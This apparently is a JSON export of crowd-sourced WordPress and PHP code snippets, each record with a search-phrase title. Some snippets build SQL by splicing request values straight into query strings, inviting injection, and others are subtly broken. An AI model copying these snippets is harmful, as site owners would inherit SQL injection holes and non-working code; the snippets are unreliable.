    "description": "define('WP_HOME','http://example.com');  define('WP_SITEURL','http://example.com');\n",
    "reg_date": "2021-10-12T10:21:16.000Z"
  },
  {
    "id": 5257,
    "keyword": null,
    "link": null,
    "title": " wp-config override site url",
    "description": "define('WP_HOME','http://example.com');  define('WP_SITEURL','http://example.com');\ndefine( 'WP_HOME', 'http://example.com' ); define( 'WP_SITEURL', 'http://example.com' );\n",
    "reg_date": "2021-10-12T10:21:16.000Z"
  },
  {
    "id": 5258,
    "keyword": null,
    "link": null,
    "title": " wp cli command activate plugin",
    "description": "# Activate plugin $ wp plugin activate hello Plugin 'hello' activated. Success: Activated 1 of 1 plugins.  # Activate plugin in entire multisite network $ wp plugin activate hello --network Plugin 'hello' network activated. Success: Network activated 1 of 1 plugins.\n// --activate is optional wp plugin install <PLUGIN-SLUG> --activate\n",
    "reg_date": "2021-10-12T10:21:16.000Z"
  },
  {
    "id": 5259,
    "keyword": null,
    "link": null,
    "title": " wp create menu location",
    "description": "function wpb_custom_new_menu() {   register_nav_menus(     array(       'my-custom-menu' => __( 'My Custom Menu' ),       'extra-menu' => __( 'Extra Menu' )     )   ); } add_action( 'init', 'wpb_custom_new_menu' ); \n",
    "reg_date": "2021-10-12T10:21:16.000Z"
  },
  {
    "id": 5260,
    "keyword": null,
    "link": null,
    "title": " wp cron disable",
    "description": "// On wp-config.php add: define('DISABLE_WP_CRON', 'true');\n",
    "reg_date": "2021-10-12T10:21:16.000Z"
  },
  {
    "id": 5261,
    "keyword": null,
    "link": null,
    "title": " wp custom rest endpoint",
    "description": "<?php add_action( 'rest_api_init', function () {   register_rest_route( 'myplugin/v1', '/author/(?P<id>\\d+)', array(     'methods' => 'GET',     'callback' => 'my_awesome_func',   ) ); } ); \n",
    "reg_date": "2021-10-12T10:21:16.000Z"
  },
  {
    "id": 5262,
    "keyword": null,
    "link": null,
    "title": " wp debug",
    "description": "// Enable WP_DEBUG mode define( 'WP_DEBUG', true );  // Enable Debug logging to the /wp-content/debug.log file define( 'WP_DEBUG_LOG', true );  // Disable display of errors and warnings define( 'WP_DEBUG_DISPLAY', false ); @ini_set( 'display_errors', 0 );  // Use dev versions of core JS and CSS files (only needed if you are modifying these core files) define( 'SCRIPT_DEBUG', true );\n// Enable WP_DEBUG mode define( 'WP_DEBUG', true );  // Enable Debug logging to the /wp-content/debug.log file define( 'WP_DEBUG_LOG', true );  // Disable display of errors and warnings define( 'WP_DEBUG_DISPLAY', false ); @ini_set( 'display_errors', 0 );\n// This enables debugging in the wp-config.php file. define( 'WP_DEBUG', true );\ndefine( 'WP_DEBUG', true ); \n",
    "reg_date": "2021-10-12T10:21:16.000Z"
  },
  {
    "id": 5263,
    "keyword": null,
    "link": null,
    "title": " wp dequeue style",
    "description": "add_action( 'wp_enqueue_scripts', function() {   if (! is_front_page()) { // allow widget style only in front page       wp_dequeue_style('fpw_styles_css');   } }); \n",
    "reg_date": "2021-10-12T10:21:17.000Z"
  },
  {
    "id": 5264,
    "keyword": null,
    "link": null,
    "title": " wp display custom fields",
    "description": "<?php // assign variables for each custom field $your_custom_field_name1 = get_post_meta(get_the_ID(), 'your_custom_field_name', true); $your_custom_field_name2 = get_post_meta(get_the_ID(), 'your_custom_field_name', true);  // if is not empty, echo html if (!empty($your_custom_field_name1)) {     echo '<h3>Label: ' . $your_custom_field_name1 . '<h3>';     } if (!empty($your_custom_field_name2)) {     echo '<p>ISBN: ' . $your_custom_field_name2 . '</p>'; } ?>\n",
    "reg_date": "2021-10-12T10:21:17.000Z"
  },
  {
    "id": 5265,
    "keyword": null,
    "link": null,
    "title": " wp do sql query from function",
    "description": "<?php // 1st Method - Declaring $wpdb as global and using it to execute an SQL query statement that returns a PHP object global $wpdb; $results = $wpdb->get_results( \"SELECT * FROM {$wpdb->prefix}options WHERE option_id = 1\", OBJECT ); \n<?php // 2nd Method - Utilizing the $GLOBALS superglobal. Does not require global keyword ( but may not be best practice ) $results = $GLOBALS['wpdb']->get_results( \"SELECT * FROM {$wpdb->prefix}options WHERE option_id = 1\", OBJECT ); \n",
    "reg_date": "2021-10-12T10:21:17.000Z"
  },
  {
    "id": 5266,
    "keyword": null,
    "link": null,
    "title": " wp enqueue",
    "description": "/**   *   Enqueue your theme styles and scripts in functions.php  *   use time() instead of a proper versioning to avoid caching when developing  */ function my_theme_enqueue_scripts() {     wp_enqueue_style( 'default-style', get_stylesheet_uri(), [], '1.0.0', 'all' ); //default styles.css     wp_enqueue_style( 'main-style', get_stylesheet_directory_uri() . '/assets/css/main.min.css', [], time(), 'all' );     wp_enqueue_script( 'main-script', get_stylesheet_directory_uri() . '/assets/js/main.min.js', [], time(), false ); } add_action( 'wp_enqueue_scripts', 'my_theme_enqueue_scripts' ); \n",
    "reg_date": "2021-10-12T10:21:17.000Z"
  },
  {
    "id": 5267,
    "keyword": null,
    "link": null,
    "title": " wp enqueue script",
    "description": "function wpdocs_theme_name_scripts() {     wp_enqueue_style( 'style-name', get_stylesheet_uri() ); /* enqueues style.css */     /* if you want to enqueue other styles use: */     /* wp_enqueue_style( 'style-name', get_template_directory_uri() . '/css/your-style-name.css' ); */     wp_enqueue_script( 'script-name', get_template_directory_uri() . '/js/example.js', array(), '1.0.0', true ); } add_action( 'wp_enqueue_scripts', 'wpdocs_theme_name_scripts' );\nfunction custom_theme_script(){ \twp_register_style('bootstrap', get_stylesheet_directory_uri() . '/css/bootstrap.css' );  \twp_enqueue_style('bootstrap');  \twp_register_style('style', get_stylesheet_directory_uri() . '/css/style.css');  \twp_enqueue_style('style');  \t   \twp_register_script('bootstrap', get_template_directory_uri() . '/js/bootstrap.min.js', array('jquery'), '20120206', true ); \twp_enqueue_script('bootstrap.min'); }  add_action('wp_enqueue_scripts', 'custom_theme_script');\nwp_enqueue_script( $handle, $src, $deps, $ver, $in_footer);  wp_enqueue_script( 'script', get_template_directory_uri() . '/js/script.js', array ( 'jquery' ), 1.1, true); \n",
    "reg_date": "2021-10-12T10:21:17.000Z"
  },
  {
    "id": 5268,
    "keyword": null,
    "link": null,
    "title": " wp enqueue styles",
    "description": "/**   *   Enqueue your theme styles and scripts in functions.php  *   use time() instead of a proper versioning to avoid caching when developing  */ function my_theme_enqueue_scripts() {     wp_enqueue_style( 'default-style', get_stylesheet_uri(), [], '1.0.0', 'all' ); //default styles.css     wp_enqueue_style( 'main-style', get_stylesheet_directory_uri() . '/assets/css/main.min.css', [], time(), 'all' );     wp_enqueue_script( 'main-script', get_stylesheet_directory_uri() . '/assets/js/main.min.js', [], time(), false ); } add_action( 'wp_enqueue_scripts', 'my_theme_enqueue_scripts' ); \nwp_enqueue_style( 'my-style', get_template_directory_uri() . '/css/my-style.css', false, '1.0', 'all' ); // Inside a parent theme wp_enqueue_style( 'my-style', get_stylesheet_directory_uri() . '/css/my-style.css', false, '1.0', 'all' ); // Inside a child theme wp_enqueue_style( 'my-style', plugins_url( '/css/my-style.css', __FILE__ ), false, '1.0', 'all' ); // Inside a plugin \nwp_enqueue_style( 'my-style', get_template_directory_uri() . '/css/my-style.css', false, '1.0', 'all' ); // Inside a parent theme wp_enqueue_style( 'my-style', get_stylesheet_directory_uri() . '/css/my-style.css', false, '1.0', 'all' ); // Inside a child theme wp_enqueue_style( 'my-style', plugins_url( '/css/my-style.css', __FILE__ ), false,\n/**   *   Enqueue your theme styles and scripts in functions.php  *   use time() instead of a proper versioning to avoid caching when developing  */ function my_theme_enqueue_scripts() {     wp_enqueue_style( 'default-style', get_stylesheet_uri(), [], '1.0.0', 'all' ); //default styles.css     wp_enqueue_style( 'main-style', get_stylesheet_directory_uri() . '/assets/css/main.min.css', [], time(), 'all' );     wp_enqueue_script( 'main-script', get_stylesheet_directory_uri() . '/assets/js/main.min.js', [], time(), false ); } add_action( 'wp_enqueue_scripts', 'my_theme_enqueue_scripts' );\n",
    "reg_date": "2021-10-12T10:21:17.000Z"
  },
  {
    "id": 5269,
    "keyword": null,
    "link": null,
    "title": " wp error log config",
    "description": "// Enable WP_DEBUG mode define( 'WP_DEBUG', true );  // Enable Debug logging to the /wp-content/debug.log file define( 'WP_DEBUG_LOG', true );  // Disable display of errors and warnings define( 'WP_DEBUG_DISPLAY', false ); @ini_set( 'display_errors', 0 );  // Use dev versions of core JS and CSS files (only needed if you are modifying these core files) define( 'SCRIPT_DEBUG', true );\n",
    "reg_date": "2021-10-12T10:21:17.000Z"
  },
  {
    "id": 5270,
    "keyword": null,
    "link": null,
    "title": " wp get attachment image class",
    "description": "<?php    // ADD CLASS on wp image function    echo wp_get_attachment_image( get_the_ID(), array('700', '600'), \"\", array( \"class\" => \"img-responsive\" ) );   ?>\n// Register Custom Post Type function custom_post_type() {  \t$labels = array( \t\t'name'                  => _x( 'Post Types', 'Post Type General Name', 'text_domain' ), \t\t'singular_name'         => _x( 'Post Type', 'Post Type Singular Name', 'text_domain' ), \t\t'menu_name'             => __( 'Post Types', 'text_domain' ), \t\t'name_admin_bar'        => __( 'Post Type', 'text_domain' ), \t\t'archives'              => __( 'Item Archives', 'text_domain' ), \t\t'attributes'            => __( 'Item Attributes', 'text_domain' ), \t\t'parent_item_colon'     => __( 'Parent Item:', 'text_domain' ), \t\t'all_items'             => __( 'All Items', 'text_domain' ), \t\t'add_new_item'          => __( 'Add New Item', 'text_domain' ), \t\t'add_new'               => __( 'Add New', 'text_domain' ), \t\t'new_item'              => __( 'New Item', 'text_domain' ), \t\t'edit_item'             => __( 'Edit Item', 'text_domain' ), \t\t'update_item'           => __( 'Update Item', 'text_domain' ), \t\t'view_item'             => __( 'View Item', 'text_domain' ), \t\t'view_items'            => __( 'View Items', 'text_domain' ), \t\t'search_items'          => __( 'Search Item', 'text_domain' ), \t\t'not_found'             => __( 'Not found', 'text_domain' ), \t\t'not_found_in_trash'    => __( 'Not found in Trash', 'text_domain' ), \t\t'featured_image'        => __( 'Featured Image', 'text_domain' ), \t\t'set_featured_image'    => __( 'Set featured image', 'text_domain' ), \t\t'remove_featured_image' => __( 'Remove featured image', 'text_domain' ), \t\t'use_featured_image'    => __( 'Use as featured image', 'text_domain' ), \t\t'insert_into_item'      => __( 'Insert into item', 'text_domain' ), \t\t'uploaded_to_this_item' => __( 'Uploaded to this item', 'text_domain' ), \t\t'items_list'            => __( 'Items list', 'text_domain' ), \t\t'items_list_navigation' => __( 'Items list navigation', 'text_domain' ), \t\t'filter_items_list'     => __( 'Filter items list', 'text_domain' ), \t); \t$args = array( \t\t'label'                 => __( 'Post Type', 'text_domain' ), \t\t'description'           => __( 'Post Type Description', 'text_domain' ), \t\t'labels'                => $labels, \t\t'supports'              => false, \t\t'taxonomies'            => array( 'category', 'post_tag' ), \t\t'hierarchical'          => false, \t\t'public'                => true, \t\t'show_ui'               => true, \t\t'show_in_menu'          => true, \t\t'menu_position'         => 5, \t\t'show_in_admin_bar'     => true, \t\t'show_in_nav_menus'     => true, \t\t'can_export'            => true, \t\t'has_archive'           => true, \t\t'exclude_from_search'   => false, \t\t'publicly_queryable'    => true, \t\t'capability_type'       => 'page', \t); \tregister_post_type( 'post_type', $args );  } add_action( 'init', 'custom_post_type', 0 );\n",
    "reg_date": "2021-10-12T10:21:17.000Z"
  },
  {
    "id": 5271,
    "keyword": null,
    "link": null,
    "title": " wp get logged in user id",
    "description": "<?php \t$user_id = get_current_user_id(); ?>\n$user_obj = get_user_by('id', 1);\n",
    "reg_date": "2021-10-12T10:21:17.000Z"
  },
  {
    "id": 5272,
    "keyword": null,
    "link": null,
    "title": " wp get meta field value",
    "description": "<?php $key_1_value = get_post_meta( get_the_ID(), 'key_1', true ); ?> \n<?php if ( get_post_meta( get_the_ID(), 'thumb', true ) ) : ?>     <a href=\"<?php the_permalink() ?>\" rel=\"bookmark\">         <img class=\"thumb\" src=\"<?php echo esc_url( get_post_meta( get_the_ID(), 'thumb', true ) ); ?>\" alt=\"<?php the_title_attribute(); ?>\" />     </a> <?php endif; ?> \n",
    "reg_date": "2021-10-12T10:21:18.000Z"
  },
  {
    "id": 5273,
    "keyword": null,
    "link": null,
    "title": " wp get post content by id",
    "description": "$post_id = 5// example post id $post_content = get_post($post_id); $content = $post_content->post_content; echo apply_filters('the_content',$content);\n$my_postid = 12;//This is page id or post id $content_post = get_post($my_postid); $content = $content_post->post_content; $content = apply_filters('the_content', $content); $content = str_replace(']]>', ']]&gt;', $content); echo $content;\n",
    "reg_date": "2021-10-12T10:21:18.000Z"
  },
  {
    "id": 5274,
    "keyword": null,
    "link": null,
    "title": " wp get posts return ids",
    "description": "// Retrieve the ID of the current item in the WordPress Loop. get_the_ID()\nget_posts(array(     'fields'          => 'ids', // Only get post IDs     'posts_per_page'  => -1 )); \n",
    "reg_date": "2021-10-12T10:21:18.000Z"
  },
  {
    "id": 5275,
    "keyword": null,
    "link": null,
    "title": " wp get term link",
    "description": "$term_link = get_term_link($term);\n",
    "reg_date": "2021-10-12T10:21:18.000Z"
  },
  {
    "id": 5276,
    "keyword": null,
    "link": null,
    "title": " wp get user meta",
    "description": "<?php \t$meta_data = get_user_meta($user_id, $key, $single); ?>\nfunction get_usermeta( $user_id, $meta_key = '' ) {     _deprecated_function( __FUNCTION__, '3.0.0', 'get_user_meta()' );     global $wpdb;     $user_id = (int) $user_id;       if ( !$user_id )         return false;       if ( !empty($meta_key) ) {         $meta_key = preg_replace('|[^a-z0-9_]|i', '', $meta_key);         $user = wp_cache_get($user_id, 'users');         // Check the cached user object.         if ( false !== $user && isset($user->$meta_key) )             $metas = array($user->$meta_key);         else             $metas = $wpdb->get_col( $wpdb->prepare(\"SELECT meta_value FROM $wpdb->usermeta WHERE user_id = %d AND meta_key = %s\", $user_id, $meta_key) );     } else {         $metas = $wpdb->get_col( $wpdb->prepare(\"SELECT meta_value FROM $wpdb->usermeta WHERE user_id = %d\", $user_id) );     }       if ( empty($metas) ) {         if ( empty($meta_key) )             return array();         else             return '';     }       $metas = array_map('maybe_unserialize', $metas);       if ( count($metas) == 1 )         return $metas[0];     else         return $metas; } \n",
    "reg_date": "2021-10-12T10:21:18.000Z"
  },
  {
    "id": 5277,
    "keyword": null,
    "link": null,
    "title": " wp is user admin",
    "description": "if ( current_user_can('administrator') ) {} // also others than admin w same capabilities if ( is_user_admin() ){} // if it is admin if ( is_admin() ){} //if the view is not the admin interface but the theme\n// Determines whether the current request is for an  // administrative interface page. is_admin()\n",
    "reg_date": "2021-10-12T10:21:18.000Z"
  },
  {
    "id": 5278,
    "keyword": null,
    "link": null,
    "title": " wp loop custom post type",
    "description": "<?php $loop = new WP_Query(     array(         'post_type' => 'yourposttypehere' // This is the name of your post type - change this as required,         'posts_per_page' => 50 // This is the amount of posts per page you want to show     ) ); while ( $loop->have_posts() ) : $loop->the_post(); // The content you want to loop goes in here: ?>   <div class=\"col-sm-4\"> My column content </div>   <?php endwhile; wp_reset_postdata(); ?> \n",
    "reg_date": "2021-10-12T10:21:18.000Z"
  },
  {
    "id": 5279,
    "keyword": null,
    "link": null,
    "title": " wp mail",
    "description": "$to = 'sendto@example.com'; $subject = 'The subject'; $body = 'The email body content'; $headers = array('Content-Type: text/html; charset=UTF-8');   wp_mail( $to, $subject, $body, $headers );\n",
    "reg_date": "2021-10-12T10:21:18.000Z"
  },
  {
    "id": 5280,
    "keyword": null,
    "link": null,
    "title": " wp options siteURL new wordpress",
    "description": "define( 'WP_HOME', 'http://example.com' ); define( 'WP_SITEURL', 'http://example.com' );\n",
    "reg_date": "2021-10-12T10:21:19.000Z"
  },
  {
    "id": 5281,
    "keyword": null,
    "link": null,
    "title": " wp override home url with php",
    "description": "// add these 2 lines to your wp-config.php,  // exactly before requiring wp-settings.php define( 'WP_HOME', 'http://localhost/site' ); define( 'WP_SITEURL', 'http://localhost/site' ); // NOTE: you'r overriting the homeurl locally, without changing the value in DB.\n",
    "reg_date": "2021-10-12T10:21:19.000Z"
  },
  {
    "id": 5282,
    "keyword": null,
    "link": null,
    "title": " wp plugin create",
    "description": "<?php /**  * Plugin Name:   My Plugin  * Description:   A plugin  * Version:       1.1.1.0  * Author:        E.Bisco  */  if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly the file  // code snippet below\n",
    "reg_date": "2021-10-12T10:21:19.000Z"
  },
  {
    "id": 5283,
    "keyword": null,
    "link": null,
    "title": " wp plugin header",
    "description": "/**  * Plugin Name:       My Basics Plugin  * Plugin URI:        https://example.com/plugins/the-basics/  * Description:       Handle the basics with this plugin.  * Version:           1.10.3  * Requires at least: 5.2  * Requires PHP:      7.2  * Author:            John Smith  * Author URI:        https://author.example.com/  * License:           GPL v2 or later  * License URI:       https://www.gnu.org/licenses/gpl-2.0.html  * Update URI:        https://example.com/my-plugin/  * Text Domain:       my-basics-plugin  * Domain Path:       /languages  */ \n",
    "reg_date": "2021-10-12T10:21:19.000Z"
  },
  {
    "id": 5284,
    "keyword": null,
    "link": null,
    "title": " wp query",
    "description": "if ( ! defined('ABSPATH') ) {     /** Set up WordPress environment */     require_once( dirname( __FILE__ ) . '/wp-load.php' ); }  global $wpdb; $results = $wpdb->get_results( \"SELECT * FROM {$wpdb->prefix}options WHERE option_id = 1\", OBJECT );\n<?php  // The Query $the_query = new WP_Query( $args );   // The Loop if ( $the_query->have_posts() ) {     echo '<ul>';     while ( $the_query->have_posts() ) {         $the_query->the_post();         echo '<li>' . get_the_title() . '</li>';     }     echo '</ul>'; } else {     // no posts found } /* Restore original Post Data */ wp_reset_postdata();\n<?php  // the query $the_query = new WP_Query( $args ); ?>   <?php if ( $the_query->have_posts() ) : ?>       <!-- pagination here -->       <!-- the loop -->     <?php while ( $the_query->have_posts() ) : $the_query->the_post(); ?>         <h2><?php the_title(); ?></h2>     <?php endwhile; ?>     <!-- end of the loop -->       <!-- pagination here -->       <?php wp_reset_postdata(); ?>   <?php else : ?>     <p><?php _e( 'Sorry, no posts matched your criteria.' ); ?></p> <?php endif; ?> \n$query = new WP_Query( array( 's' => 'keyword' ) );\n$query = new WP_Query( array( 'author__in' => array( 2, 6 ) ) ); \nQuery Loop\n",
    "reg_date": "2021-10-12T10:21:19.000Z"
  },
  {
    "id": 5285,
    "keyword": null,
    "link": null,
    "title": " wp query get by taxonomy",
    "description": "$the_query = new WP_Query( array(     'post_type' => 'Adverts',     'tax_query' => array(         array (             'taxonomy' => 'advert_tag',             'field' => 'slug',             'terms' => 'politics',         )     ), ) );    // The Loop     if ( $the_query->have_posts() ) {         while ( $the_query->have_posts() ) {           $the_query->the_post();           the_title(); //show post title          }     }\n",
    "reg_date": "2021-10-12T10:21:19.000Z"
  },
  {
    "id": 5286,
    "keyword": null,
    "link": null,
    "title": " wp query get custom post type",
    "description": "  <?php       \t   $args = array(         'post_type' => 'custom_type',       'post_status' => 'publish',       'posts_per_page' => 8,        'orderby' => 'title',        'order' => 'ASC',            );    $loop = new WP_Query( $args );     while ( $loop->have_posts() ) : $loop->the_post();        print the_title();        the_excerpt();    endwhile;    wp_reset_postdata();    ?>\n//WordPress: Query a custom post type //For example, query all Case Study post types  <?php query_posts('post_type=case_studies'); ?>\n",
    "reg_date": "2021-10-12T10:21:19.000Z"
  },
  {
    "id": 5287,
    "keyword": null,
    "link": null,
    "title": " wp query item count",
    "description": "<?php $count = $custom_posts->found_posts; ?> \n",
    "reg_date": "2021-10-12T10:21:19.000Z"
  },
  {
    "id": 5288,
    "keyword": null,
    "link": null,
    "title": " wp query order by taxonomy",
    "description": "$timeline_taxonomies = get_terms(array(     'fields' => 'ids',   //get the IDs     'taxonomy'     => 'taxonomy_name',     'orderby'      => 'term_order',     'hide_empty'   => true, ));\n",
    "reg_date": "2021-10-12T10:21:19.000Z"
  },
  {
    "id": 5289,
    "keyword": null,
    "link": null,
    "title": " wp query to get posts",
    "description": "<?php  $args = array(  \t'post_type'   => 'post', \t'post_status' => 'future' ); $scheduled = new WP_Query( $args );  if ( $scheduled->have_posts() ) :  ?> \t<?php while( $scheduled->have_posts() ) : $scheduled->the_post() ?> \t\t<!-- Display Post Here --> \t<?php endwhile ?> <?php else : ?> \t<!-- Content If No Posts --> <?php endif ?>\n",
    "reg_date": "2021-10-12T10:21:20.000Z"
  },
  {
    "id": 5290,
    "keyword": null,
    "link": null,
    "title": " wp redirect",
    "description": "function redirect_to_home() {   if(!is_admin() && is_page('2')) {     wp_redirect(home_url());     exit();   } } add_action('template_redirect', 'redirect_to_home');\nadd_action( 'template_redirect', 'redirect_to_other_page' ); function redirect_to_other_page() {     if ( is_page( 143 ) ) { \t         wp_redirect( '\"'.home_url().'/services/messenger/\"', 301 );       ///wp_redirect( 'example.com/page', 301 );      exit;     } }\nwp_redirect( $url ); \n",
    "reg_date": "2021-10-12T10:21:20.000Z"
  },
  {
    "id": 5291,
    "keyword": null,
    "link": null,
    "title": " wp redirect to home page",
    "description": "function redirect_to_home() {   if(!is_admin() && is_page('2')) {     wp_redirect(home_url());     exit();   } } add_action('template_redirect', 'redirect_to_home');\nwp_redirect( $url ); \n",
    "reg_date": "2021-10-12T10:21:20.000Z"
  },
  {
    "id": 5292,
    "keyword": null,
    "link": null,
    "title": " wp revisions config",
    "description": "// on wp-config.php --> define( 'WP_POST_REVISIONS', 5 ); // Save max 5 revisions define('AUTOSAVE_INTERVAL', 120 ); // Save revision automatically after 2 minutes (default 60 sec.)\n// Inside wp-config.php -> LIMIT POST REVISIONS to 8 define( 'WP_POST_REVISIONS', 8 );\n",
    "reg_date": "2021-10-12T10:21:20.000Z"
  },
  {
    "id": 5293,
    "keyword": null,
    "link": null,
    "title": " wp safe redirect",
    "description": "<?php // Note: wp_safe_redirect() does not exit automatically,  // and should almost always be followed by a call to exit // This is for WordPress ?> <?php   // $url = string   wp_safe_redirect( $url );   exit; ?>\n",
    "reg_date": "2021-10-12T10:21:20.000Z"
  },
  {
    "id": 5294,
    "keyword": null,
    "link": null,
    "title": " wp schedule event",
    "description": "register_activation_hook( __FILE__, 'my_activation' ); add_action( 'my_hourly_event', 'do_this_hourly' );   function my_activation() {     wp_schedule_event( time(), 'hourly', 'my_hourly_event' ); }   function do_this_hourly() {     // do something every hour }  register_deactivation_hook( __FILE__, 'my_deactivation' );   function my_deactivation() {     wp_clear_scheduled_hook( 'my_hourly_event' ); }\n",
    "reg_date": "2021-10-12T10:21:20.000Z"
  },
  {
    "id": 5295,
    "keyword": null,
    "link": null,
    "title": " wp shortcode",
    "description": "function create_shortcode(){     return \"<h2>Hello world !</h2>\"; } add_shortcode('my_shortcode', 'create_shortcode'); // Use [my_shortcode]\n<?php echo do_shortcode('[name_of_shortcode parameters=\"\"]'); ?>\nfunction wp_demo_shortcode() {   //Turn on output buffering ob_start(); $code = 'Hello World'; ob_get_clean();   // Output needs to be return return $code; }   // register shortcode add_shortcode('helloworld', 'wp_demo_shortcode'); \n// function that runs when shortcode is called function wpb_demo_shortcode() {    // Things that you want to do.  $message = 'Hello world!';    // Output needs to be return return $message; }  // register shortcode add_shortcode('greeting', 'wpb_demo_shortcode');  \n<?php echo do_shortcode(\"[name_of_your_shortcode]\"); ?>\n",
    "reg_date": "2021-10-12T10:21:20.000Z"
  },
  {
    "id": 5296,
    "keyword": null,
    "link": null,
    "title": " wp tax query",
    "description": "//simple 'tax_query' => array(     array(         'taxonomy' => 'people',         'field'    => 'slug',         'terms'    => 'bob',     ), ),  //more complicated 'tax_query' => array(     'relation' => 'OR',     array(         'taxonomy' => 'category',         'field'    => 'slug',         'terms'    => array( 'quotes' ),     ),     array(         'relation' => 'AND',         array(             'taxonomy' => 'post_format',             'field'    => 'slug',             'terms'    => array( 'post-format-quote' ),         ),         array(             'taxonomy' => 'category',             'field'    => 'slug',             'terms'    => array( 'wisdom' ),         ),     ), ),\n'tax_query' => array(     array(         'taxonomy' => 'video_type',         'terms' => 'episode',         'field' => 'slug',         'include_children' => true,         'operator' => 'IN'     ) ), \n",
    "reg_date": "2021-10-12T10:21:21.000Z"
  },
  {
    "id": 5297,
    "keyword": null,
    "link": null,
    "title": " wp tax query in",
    "description": "'tax_query' => array(     array(         'taxonomy' => 'video_type',         'terms' => 'episode',         'field' => 'slug',         'include_children' => true,         'operator' => 'IN'     ) ), \n",
    "reg_date": "2021-10-12T10:21:21.000Z"
  },
  {
    "id": 5298,
    "keyword": null,
    "link": null,
    "title": " wpdb->prepare",
    "description": "$table_name='myTable';   $myID=12;   $wpdb->query($wpdb->prepare(\"UPDATE `$table_name` SET `your_column_1` = 1 WHERE `$table_name`.`your_column_id` = %d\", $myID)); \n",
    "reg_date": "2021-10-12T10:21:21.000Z"
  },
  {
    "id": 5299,
    "keyword": null,
    "link": null,
    "title": " wpdb get results foreach",
    "description": "$results=$wpdb->get_results(\"SELECT * FROM your_table_name WHERE id LIKE' . $id . ';\"); foreach($results  as $key => $row) { // each column in your row will be accessible like this $my_column = $row->column_name;}\n \t$records=$wpdb->query(\"SELECT * FROM $wpdb->posts WHERE post_type = 'elements' AND post_status = 'publish'\");  \twhile($data=$records->fetch_assoc()) \t{ \t\tprint_r($data); \t} \t }\n",
    "reg_date": "2021-10-12T10:21:21.000Z"
  },
  {
    "id": 5300,
    "keyword": null,
    "link": null,
    "title": " wpdb last query",
    "description": "// Print last SQL query string echo $wpdb->last_query;\necho $wpdb->last_query;\n",
    "reg_date": "2021-10-12T10:21:21.000Z"
  },
  {
    "id": 5301,
    "keyword": null,
    "link": null,
    "title": " wpdb num rows",
    "description": "global $wpdb; $wpdb->get_results(\"                     SELECT * FROM \" . $wpdb->prefix . \"product_order                          WHERE                          rel = '\" . $post[\"id\"] . \"' AND                          `range` = '\" . $range . \"' AND                          category = '\" . $range . \"'                 \");   echo $wpdb->num_rows; \n",
    "reg_date": "2021-10-12T10:21:21.000Z"
  },
  {
    "id": 5302,
    "keyword": null,
    "link": null,
    "title": " wpml get current language filter",
    "description": "$my_current_lang = apply_filters( 'wpml_current_language', NULL ); \n",
    "reg_date": "2021-10-12T10:21:21.000Z"
  },
  {
    "id": 5303,
    "keyword": null,
    "link": null,
    "title": " wpml get translated post id",
    "description": "// WPML get Post on translated Language // The only parameter you have to use is -> $postIdToTranslate $translatedPostId = icl_object_id($postIdToTranslate, 'page', false, ICL_LANGUAGE_CODE); $myPost = get_post( $translatedPostId );\n",
    "reg_date": "2021-10-12T10:21:21.000Z"
  },
  {
    "id": 5304,
    "keyword": null,
    "link": null,
    "title": " write if and else in one line laravel",
    "description": "//in blade: {{ ($data->position == 1) ? 'active' : 'disable'}}  //in Controller $result = ($data->status == 1) ? 'active' : 'disable'\n",
    "reg_date": "2021-10-12T10:21:21.000Z"
  },
  {
    "id": 5305,
    "keyword": null,
    "link": null,
    "title": " write if and else in one line php",
    "description": "$result = ($data->status == 1) ? 'active' : 'disable'\n/* most basic usage */ $var = 5; $var_is_greater_than_two = ($var > 2 ? true : false); // returns true\necho ($var1 >= $var2) ? 'this is true' : 'this is false';\n<?php if ($requestVars->_name == '') echo $redText; ?>\n",
    "reg_date": "2021-10-12T10:21:21.000Z"
  },
  {
    "id": 5306,
    "keyword": null,
    "link": null,
    "title": " write in a file using php",
    "description": "$myfile = fopen(\"newfile.txt\", \"w\") or die(\"Unable to open file!\"); fwrite($myfile, \"Content to write to file\"); fclose($myfile);\n$myFile = \"testFile.txt\"; $fh = fopen($myFile, 'w') or die(\"can't open file\"); $stringData = \"Bobby Bopper\\n\"; fwrite($fh, $stringData); $stringData = \"Tracy Tanner\\n\"; fwrite($fh, $stringData); fclose($fh); \n<?php $myfile = fopen(\"file_name.txt\", \"w\") or die(\"Unable to open file!\"); $txt = \"Hello world\\n\"; fwrite($myfile, $txt); $txt = \" Php.\\n\"; fwrite($myfile, $txt); fclose($myfile); ?>\n",
    "reg_date": "2021-10-12T10:21:22.000Z"
  },
  {
    "id": 5307,
    "keyword": null,
    "link": null,
    "title": " write php online",
    "description": "Try this sites to write php code online:    http://www.writephponline.com/   http://sandbox.onlinephpfunctions.com/   https://paiza.io/en/projects/new   http://phptester.net/   https://www.tutorialspoint.com/execute_php_online.php   https://rextester.com/l/php_online_compiler   http://phpfiddle.org/   https://repl.it/languages/php_cli   https://www.jdoodle.com/php-online-editor/\n",
    "reg_date": "2021-10-12T10:21:22.000Z"
  },
  {
    "id": 5308,
    "keyword": null,
    "link": null,
    "title": " write test case in react native",
    "description": "import React from \"react\"; import renderer from \"react-test-renderer\"; import App from \"./App.js\" describe(\"<App />\", () => {     it('has 1 child', () => {         const tree = renderer.create(<App />).toJSON();         expect(tree.children.length).toBe(1);     }); }); \n",
    "reg_date": "2021-10-12T10:21:22.000Z"
  },
  {
    "id": 5309,
    "keyword": null,
    "link": null,
    "title": " write to file php",
    "description": "$myfile = fopen(\"newfile.txt\", \"w\") or die(\"Unable to open file!\"); fwrite($myfile, \"Content to write to file\"); fclose($myfile);\n$myFile = \"testFile.txt\"; $fh = fopen($myFile, 'w') or die(\"can't open file\"); $stringData = \"Bobby Bopper\\n\"; fwrite($fh, $stringData); $stringData = \"Tracy Tanner\\n\"; fwrite($fh, $stringData); fclose($fh); \n<?php $myfile = fopen(\"file_name.txt\", \"w\") or die(\"Unable to open file!\"); $txt = \"Hello world\\n\"; fwrite($myfile, $txt); $txt = \" Php.\\n\"; fwrite($myfile, $txt); fclose($myfile); ?>\n",
    "reg_date": "2021-10-12T10:21:22.000Z"
  },
  {
    "id": 5310,
    "keyword": null,
    "link": null,
    "title": " xamp to test on mobile",
    "description": "// XAMPP ANDROID TESTING FROM SAME NETWORK / ROUTER IP ADDRESS php -S 0.0.0.0:8080 -t FOLDER_NAME_WHO_HAVE_INDEX_FILE_IN_IT\n// XAMPP ANDROID TESTING FROM SAME NETWORK / ROUTER IP ADDRESS php -S 0.0.0.0:8080 -t FOLDER_NAME_WHO_HAVE_INDEX_FILE_IN_IT\n",
    "reg_date": "2021-10-12T10:21:22.000Z"
  },
  {
